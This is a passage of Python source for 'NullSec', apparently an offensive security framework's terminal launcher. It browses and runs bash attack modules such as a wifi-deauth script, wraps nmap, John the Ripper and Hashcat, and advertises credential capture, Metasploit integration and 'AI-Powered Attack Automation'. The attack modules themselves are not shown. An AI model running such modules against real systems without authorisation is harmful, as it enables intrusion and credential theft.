            enhanced = f"{Colors.GREEN}[Enhanced]{Colors.RESET}" if config_exists else ""
            
            print(f"""
{Colors.RED}[{mod['id']:3d}]{Colors.RESET} {mod['icon']} {Colors.BOLD}{mod['name']}{Colors.RESET} {enhanced}
      {Colors.CYAN}{mod['category']}{Colors.RESET} - {Colors.DIM}{mod['desc']}{Colors.RESET}
""")
        
        if len(results) > 15:
            print(f"\n{Colors.DIM}... and {len(results) - 15} more results{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        print(f" {Colors.YELLOW}[1-{len(MODULES)}]{Colors.RESET} Launch Module  {Colors.YELLOW}[B]{Colors.RESET} Back")
        print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'b':
            break
        else:
            try:
                mod_id = int(choice)
                mod = next((m for m in MODULES if m['id'] == mod_id), None)
                if mod:
                    launch_module_with_options(mod)
            except ValueError:
                pass

def show_recent_modules():
    """Show recently used modules"""
    clear_screen()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    RECENTLY USED MODULES
═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    if not COMMAND_HISTORY:
        print(f"\n{Colors.YELLOW}[*] No modules have been executed yet{Colors.RESET}")
    else:
        recent = []
        for cmd in reversed(COMMAND_HISTORY[-10:]):
            if cmd.endswith('.sh'):
                script_name = os.path.basename(cmd)
                mod = next((m for m in MODULES if m['script'] == script_name), None)
                if mod and mod not in recent:
                    recent.append(mod)
        
        if recent:
            for i, mod in enumerate(recent, 1):
                print(f"\n  {Colors.RED}[{mod['id']}]{Colors.RESET} {mod['icon']} {Colors.BOLD}{mod['name']}{Colors.RESET}")
                print(f"      {Colors.DIM}{mod['desc']}{Colors.RESET}")
        else:
            print(f"\n{Colors.YELLOW}[*] No recent module executions found{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")

def show_enhanced_modules():
    """Show only modules with enhanced JSON configs"""
    enhanced = []
    for mod in MODULES:
        config_path = os.path.join(ATTACK_DIR, mod['script'].replace('.sh', '.json'))
        if os.path.exists(config_path):
            enhanced.append(mod)
    
    page = 0
    page_size = 10
    total_pages = (len(enhanced) + page_size - 1) // page_size
    
    while True:
        clear_screen()
        start = page * page_size
        end = min(start + page_size, len(enhanced))
        
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    ENHANCED MODULES (Interactive Framework)
                    {len(enhanced)} modules - Page {page + 1}/{total_pages}
═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        for mod in enhanced[start:end]:
            print(f"""
{Colors.RED}[{mod['id']:3d}]{Colors.RESET} {Colors.GREEN}✓{Colors.RESET} {mod['icon']} {Colors.BOLD}{mod['name']}{Colors.RESET}
      {Colors.CYAN}{mod['category']}{Colors.RESET} - {Colors.DIM}{mod['desc']}{Colors.RESET}
""")
        
        print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        print(f" {Colors.YELLOW}[N]{Colors.RESET} Next  {Colors.YELLOW}[P]{Colors.RESET} Previous  {Colors.YELLOW}[1-{len(MODULES)}]{Colors.RESET} Launch  {Colors.YELLOW}[B]{Colors.RESET} Back")
        print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'b':
            break
        elif choice == 'n':
            page = (page + 1) % total_pages
        elif choice == 'p':
            page = (page - 1) % total_pages
        else:
            try:
                mod_id = int(choice)
                mod = next((m for m in MODULES if m['id'] == mod_id), None)
                if mod:
                    launch_module_with_options(mod)
            except ValueError:
                pass

def launch_module_with_options(mod):
    """Launch a module with execution method selection"""
    clear_screen()
    config_path = os.path.join(ATTACK_DIR, mod['script'].replace('.sh', '.json'))
    has_config = os.path.exists(config_path)
    
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    LAUNCH MODULE
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.BOLD}{mod['icon']} {mod['name']}{Colors.RESET}
{Colors.DIM}───────────────────────────────────────────────────────────────────────{Colors.RESET}
{Colors.CYAN}Category:{Colors.RESET}     {mod['category']}
{Colors.CYAN}Description:{Colors.RESET} {mod['desc']}
{Colors.CYAN}Script:{Colors.RESET}      {mod['script']}
{Colors.CYAN}Enhanced:{Colors.RESET}    {Colors.GREEN}Yes{Colors.RESET if has_config else Colors.YELLOW}No{Colors.RESET}

{Colors.YELLOW}Launch Options:{Colors.RESET}
  {Colors.RED}[1]{Colors.RESET} Enhanced Framework (Interactive with logging)
  {Colors.RED}[2]{Colors.RESET} Standard Execution (Direct bash execution)
  {Colors.RED}[3]{Colors.RESET} Desktop GUI (Launch in GUI if available)
  {Colors.RED}[4]{Colors.RESET} External Terminal (New window)
  {Colors.RED}[5]{Colors.RESET} View Module Details

  {Colors.GREEN}[B]{Colors.RESET} Back

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    
    choice = input(f"{Colors.WHITE}  Select launch method: {Colors.RESET}").strip()
    
    if choice == '1':
        if has_config:
            run_module(mod)
        else:
            print(f"\n{Colors.YELLOW}[!] No enhanced config available, using standard execution{Colors.RESET}")
            time.sleep(1)
            run_module(mod)
    elif choice == '2':
        script_path = os.path.join(ATTACK_DIR, mod['script'])
        subprocess.run(['bash', script_path])
        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
    elif choice == '3':
        launch_desktop_gui()
    elif choice == '4':
        run_module(mod, external=True)
    elif choice == '5':
        view_module_details(mod, has_config, config_path)

def view_module_details(mod, has_config, config_path):
    """View detailed module information"""
    clear_screen()
    
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    MODULE DETAILS
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.BOLD}{mod['icon']} {mod['name']}{Colors.RESET}
{Colors.DIM}───────────────────────────────────────────────────────────────────────{Colors.RESET}
{Colors.CYAN}ID:{Colors.RESET}          {mod['id']}
{Colors.CYAN}Category:{Colors.RESET}    {mod['category']}
{Colors.CYAN}Description:{Colors.RESET} {mod['desc']}
{Colors.CYAN}Script:{Colors.RESET}      {mod['script']}
{Colors.CYAN}Path:{Colors.RESET}        {os.path.join(ATTACK_DIR, mod['script'])}
{Colors.CYAN}Enhanced:{Colors.RESET}    {Colors.GREEN}Yes{Colors.RESET if has_config else Colors.YELLOW}No{Colors.RESET}
""")
    
    if has_config:
        try:
            with open(config_path, 'r') as f:
                config_data = json.load(f)
            
            print(f"""
{Colors.CYAN}Enhanced Configuration:{Colors.RESET}
{Colors.CYAN}  Author:{Colors.RESET}      {config_data.get('author', 'Unknown')}
{Colors.CYAN}  Version:{Colors.RESET}     {config_data.get('version', '1.0')}
{Colors.CYAN}  Parameters:{Colors.RESET}  {len(config_data.get('parameters', []))} parameters
""")
            
            if config_data.get('parameters'):
                print(f"\n{Colors.CYAN}Parameters:{Colors.RESET}")
                for param in config_data.get('parameters', [])[:5]:
                    req = f"{Colors.RED}*{Colors.RESET}" if param.get('required') else ""
                    print(f"  • {param.get('name')} {req} - {param.get('description', 'No description')[:60]}")
                
                if len(config_data.get('parameters', [])) > 5:
                    print(f"  {Colors.DIM}... and {len(config_data['parameters']) - 5} more{Colors.RESET}")
        except:
            pass
    
    print(f"\n{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}")
    input(f"{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")

def launch_desktop_gui():
    """Launch the desktop GUI"""
    gui_script = os.path.join(SCRIPT_DIR, 'nullsec-desktop', 'nullsec_desktop.py')
    if os.path.exists(gui_script):
        print(f"\n{Colors.GREEN}[*] Launching NullSec Desktop GUI...{Colors.RESET}")
        subprocess.Popen(['python3', gui_script])
        time.sleep(1)
    else:
        print(f"\n{Colors.RED}[!] Desktop GUI not found at: {gui_script}{Colors.RESET}")
        input(f"{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")

def launch_cli_framework():
    """Information about CLI framework usage"""
    clear_screen()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    CLI FRAMEWORK USAGE
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.YELLOW}Enhanced Framework (Recommended):{Colors.RESET}
  cd ~/nullsec
  python3 module-framework.py nullsecurity/<module>.sh nullsecurity/<module>.json

{Colors.YELLOW}Standard Execution:{Colors.RESET}
  cd ~/nullsec/nullsecurity
  bash <module>.sh

{Colors.YELLOW}Current Launcher:{Colors.RESET}
  ./nullsec-launcher.py    # This launcher (you are here)

{Colors.YELLOW}Desktop GUI:{Colors.RESET}
  python3 nullsec-launcher.py    # GUI mode
  # Or from applications menu: "NullSec Framework"

{Colors.YELLOW}Examples:{Colors.RESET}
  # Enhanced with interactive parameters:
  python3 module-framework.py nullsecurity/port-scanner.sh nullsecurity/port-scanner.json
  
  # Direct execution:
  bash nullsecurity/wifi-deauth.sh
  
  # From this launcher:
  Select any module number from main menu

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    input(f"{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")

def show_framework_info():
    """Display framework information and documentation"""
    clear_screen()
    print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                    NULLSEC FRAMEWORK INFORMATION
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.GREEN}ENHANCED FRAMEWORK v3.0{Colors.RESET}
{Colors.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}

{Colors.YELLOW}Features:{Colors.RESET}
  {Colors.GREEN}✓{Colors.RESET} {len(MODULES)} Enhanced Attack Modules with Interactive Parameters
  {Colors.GREEN}✓{Colors.RESET} Comprehensive Logging System (~/nullsec/logs/targets/)
  {Colors.GREEN}✓{Colors.RESET} Automatic Vulnerability Tracking & Classification
  {Colors.GREEN}✓{Colors.RESET} SUMMARY.md Reports with Findings & Next Steps
  {Colors.GREEN}✓{Colors.RESET} 8 Parameter Types (IP, Port, URL, File, Choice, etc.)
  {Colors.GREEN}✓{Colors.RESET} Beautiful Color-Coded UI with Validation
  {Colors.GREEN}✓{Colors.RESET} Metasploit & Shodan Integration
  {Colors.GREEN}✓{Colors.RESET} AI-Powered Attack Automation

{Colors.YELLOW}Log Structure:{Colors.RESET}
  {Colors.CYAN}~/nullsec/logs/targets/[target]/{Colors.RESET}
    ├── SUMMARY.md                  # Complete attack report
    ├── [module]_[timestamp].log    # Execution logs
    ├── scans/                      # Scan results
    ├── exploits/                   # Exploitation data
    ├── credentials/                # Captured credentials
    └── screenshots/                # Visual evidence

{Colors.YELLOW}Documentation:{Colors.RESET}
  {Colors.WHITE}•{Colors.RESET} ENHANCED_FRAMEWORK_GUIDE.md - User guide
  {Colors.WHITE}•{Colors.RESET} MODULE_DEVELOPMENT_GUIDE.md - Developer guide
  {Colors.WHITE}•{Colors.RESET} ENHANCED_MODULES_CATALOG.md - Complete module catalog
  {Colors.WHITE}•{Colors.RESET} MODULE_ENHANCEMENTS_SUMMARY.md - Feature overview

{Colors.YELLOW}Usage:{Colors.RESET}
  {Colors.WHITE}CLI:{Colors.RESET}      ./nullsec-launcher.py
  {Colors.WHITE}Desktop:{Colors.RESET}  python3 nullsec-launcher.py
  {Colors.WHITE}Direct:{Colors.RESET}   python3 module-framework.py <module.sh> <module.json>

{Colors.DIM}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
    input(f"{Colors.WHITE}  Press ENTER to continue...{Colors.RESET}")

def tools_menu():
    """Display tools and utilities menu"""
    while True:
        clear_screen()
        print(f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════
                         NULLSEC TOOLS & UTILITIES
═══════════════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.YELLOW}System Tools:{Colors.RESET}
  {Colors.RED}[1]{Colors.RESET} Network Configuration (ifconfig/ip addr)
  {Colors.RED}[2]{Colors.RESET} System Information (uname -a)
  {Colors.RED}[3]{Colors.RESET} Process Monitor (top/htop)
  {Colors.RED}[4]{Colors.RESET} Network Connections (netstat/ss)
  {Colors.RED}[5]{Colors.RESET} Disk Usage (df -h)

{Colors.YELLOW}Security Tools:{Colors.RESET}
  {Colors.RED}[6]{Colors.RESET} Nmap Network Scanner
  {Colors.RED}[7]{Colors.RESET} Wireshark Packet Analyzer
  {Colors.RED}[8]{Colors.RESET} Burp Suite Web Proxy
  {Colors.RED}[9]{Colors.RESET} John the Ripper Password Cracker
  {Colors.RED}[10]{Colors.RESET} Hashcat GPU Cracker

{Colors.YELLOW}Framework Tools:{Colors.RESET}
  {Colors.RED}[11]{Colors.RESET} Validate Module Configs
  {Colors.RED}[12]{Colors.RESET} Generate Module Catalog
  {Colors.RED}[13]{Colors.RESET} Test Enhanced Modules
  {Colors.RED}[14]{Colors.RESET} View Command History
  {Colors.RED}[15]{Colors.RESET} Clean Log Files

{Colors.YELLOW}Utilities:{Colors.RESET}
  {Colors.RED}[16]{Colors.RESET} Base64 Encode/Decode
  {Colors.RED}[17]{Colors.RESET} Hash Generator (MD5/SHA)
  {Colors.RED}[18]{Colors.RESET} Port Availability Check
  {Colors.RED}[19]{Colors.RESET} IP Geolocation Lookup
  {Colors.RED}[20]{Colors.RESET} DNS Lookup Tool

  {Colors.GREEN}[B]{Colors.RESET} Back to Main Menu

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════{Colors.RESET}
""")
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'b':
            break
        elif choice == '1':
            subprocess.run(['ip', 'addr', 'show'], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '2':
            subprocess.run(['uname', '-a'], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '3':
            subprocess.run(['htop'] if check_command_exists('htop') else ['top'], check=False)
        elif choice == '4':
            subprocess.run(['ss', '-tuln'] if check_command_exists('ss') else ['netstat', '-tuln'], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '5':
            subprocess.run(['df', '-h'], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '6':
            target = input(f"\n{Colors.WHITE}  Target IP/hostname: {Colors.RESET}")
            if target:
                subprocess.run(['nmap', '-sV', target], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '7':
            subprocess.run(['wireshark'], check=False)
        elif choice == '8':
            subprocess.run(['burpsuite'], check=False)
        elif choice == '9':
            subprocess.run(['john'], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '10':
            subprocess.run(['hashcat', '--help'], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '11':
            script = os.path.join(SCRIPT_DIR, 'validate-modules.sh')
            if os.path.exists(script):
                subprocess.run(['bash', script], check=False)
            else:
                print(f"{Colors.RED}[!] Validation script not found{Colors.RESET}")
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '12':
            script = os.path.join(SCRIPT_DIR, 'generate-catalog.py')
            if os.path.exists(script):
                subprocess.run(['python3', script], check=False)
            else:
                print(f"{Colors.RED}[!] Catalog generator not found{Colors.RESET}")
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '13':
            script = os.path.join(SCRIPT_DIR, 'test-enhancements.sh')
            if os.path.exists(script):
                subprocess.run(['bash', script], check=False)
            else:
                print(f"{Colors.RED}[!] Test script not found{Colors.RESET}")
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '14':
            if COMMAND_HISTORY:
                print(f"\n{Colors.CYAN}Command History:{Colors.RESET}")
                for i, cmd in enumerate(COMMAND_HISTORY[-20:], 1):
                    print(f"  {Colors.DIM}{i}.{Colors.RESET} {cmd}")
            else:
                print(f"\n{Colors.YELLOW}[*] No command history{Colors.RESET}")
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '15':
            logs_dir = os.path.join(os.path.expanduser('~'), 'nullsec', 'logs')
            if os.path.exists(logs_dir):
                confirm = input(f"\n{Colors.RED}[!] Delete all logs in {logs_dir}? (y/N): {Colors.RESET}").lower()
                if confirm == 'y':
                    subprocess.run(['rm', '-rf', logs_dir], check=False)
                    os.makedirs(logs_dir, exist_ok=True)
                    print(f"{Colors.GREEN}[+] Logs cleaned{Colors.RESET}")
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '16':
            data = input(f"\n{Colors.WHITE}  Enter data: {Colors.RESET}")
            action = input(f"{Colors.WHITE}  (E)ncode or (D)ecode: {Colors.RESET}").lower()
            if action == 'e':
                import base64
                encoded = base64.b64encode(data.encode()).decode()
                print(f"\n{Colors.GREEN}Encoded:{Colors.RESET} {encoded}")
            elif action == 'd':
                import base64
                try:
                    decoded = base64.b64decode(data).decode()
                    print(f"\n{Colors.GREEN}Decoded:{Colors.RESET} {decoded}")
                except:
                    print(f"{Colors.RED}[!] Invalid base64{Colors.RESET}")
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '17':
            data = input(f"\n{Colors.WHITE}  Enter data: {Colors.RESET}")
            import hashlib
            print(f"\n{Colors.CYAN}MD5:{Colors.RESET}    {hashlib.md5(data.encode()).hexdigest()}")
            print(f"{Colors.CYAN}SHA1:{Colors.RESET}   {hashlib.sha1(data.encode()).hexdigest()}")
            print(f"{Colors.CYAN}SHA256:{Colors.RESET} {hashlib.sha256(data.encode()).hexdigest()}")
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '18':
            port = input(f"\n{Colors.WHITE}  Port number: {Colors.RESET}")
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', int(port)))
            if result == 0:
                print(f"{Colors.RED}[!] Port {port} is in use{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}[+] Port {port} is available{Colors.RESET}")
            sock.close()
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '19':
            ip = input(f"\n{Colors.WHITE}  IP address: {Colors.RESET}")
            subprocess.run(['curl', f'http://ip-api.com/json/{ip}'], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        elif choice == '20':
            domain = input(f"\n{Colors.WHITE}  Domain: {Colors.RESET}")
            subprocess.run(['dig', domain], check=False)
            input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
            time.sleep(1)

def show_credits():
    """Display credits and information"""
    clear_screen()
    print(f"""
{Colors.RED}
 ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
 ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  ☠  OFFENSIVE SECURITY OPERATIONS FRAMEWORK (PRIVATE COPY)  ☠
  ═══════════════════════════════════════════════════════════════════
  
  {Colors.YELLOW}System:{Colors.WHITE} nullsec-framework (PRIVATE COPY) - Enhanced Framework{Colors.CYAN}
  
  ═══════════════════════════════════════════════════════════════════
  {Colors.WHITE}Developed by:{Colors.CYAN}
  {Colors.MAGENTA}bad-antics development{Colors.CYAN}
  {Colors.DIM}github.com/bad-antics{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  
  {Colors.GREEN}• {len(MODULES)} Custom Attack Modules{Colors.CYAN}
  {Colors.GREEN}• Metasploit Framework Integration{Colors.CYAN}
  {Colors.GREEN}• Interactive Console Interface{Colors.CYAN}
  {Colors.GREEN}• Live + Test Mode Operations{Colors.CYAN}
  {Colors.GREEN}• Multi-Category Attack Coverage{Colors.CYAN}
  {Colors.GREEN}• Auto-Discovery Module System{Colors.CYAN}
  {Colors.GREEN}• AI-Powered Attack Automation{Colors.CYAN}
  {Colors.GREEN}• Shodan Intelligence Integration{Colors.CYAN}
  
  ═══════════════════════════════════════════════════════════════════
  {Colors.YELLOW}⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠{Colors.CYAN}
  
  {Colors.DIM}This framework is designed for professional{Colors.CYAN}
  {Colors.DIM}penetration testers and red team operators.{Colors.CYAN}
  {Colors.DIM}Unauthorized access to computer systems is illegal.{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
{Colors.RESET}
""")
    input(f"{Colors.WHITE}  Press ENTER to continue...{Colors.RESET}")

def main():
    """Main application loop"""
    page = 0
    page_size = 15
    total_pages = (len(MODULES) + page_size - 1) // page_size
    
    while True:
        clear_screen()
        print_banner()
        print_menu(page, page_size)
        
        choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
        
        if choice == 'q':
            clear_screen()
            print(f"""
{Colors.RED}
 ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
 ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
  ☠  NULLSEC OPERATIONS TERMINATED  ☠
  ═══════════════════════════════════════════════════════════════════
  
  Stay dangerous. Stay anonymous.
  
  {Colors.MAGENTA}bad-antics development{Colors.CYAN}
  {Colors.DIM}github.com/bad-antics{Colors.CYAN}
  ═══════════════════════════════════════════════════════════════════
{Colors.RESET}
""")
            sys.exit(0)
        
        elif choice == 'n':
            page = (page + 1) % total_pages
        elif choice == 'p':
            page = (page - 1) % total_pages
        elif choice == 'a':
            run_all_modules()
        elif choice == 'r':
            run_random_module()
        elif choice == 'c':
            category_filter()
        elif choice == 's':
            search_modules()
        elif choice == 'e':
            command_console()
        elif choice == 'm':
            msf_integration()
        elif choice == 'h':
            shodan_search()
        elif choice == 'd':
            detailed_module_browser()
        elif choice == 'i':
            launch_ai_console()
        elif choice == 'f':
            show_framework_info()
        elif choice == 't':
            tools_menu()
        elif choice == 'x':
            show_credits()
        else:
            try:
                mod_id = int(choice)
                mod = next((m for m in MODULES if m['id'] == mod_id), None)
                if mod:
                    run_module(mod)
                else:
                    print(f"{Colors.RED}[!] Invalid module number{Colors.RESET}")
                    time.sleep(1)
            except ValueError:
                print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Interrupted{Colors.RESET}\n")
        sys.exit(0)
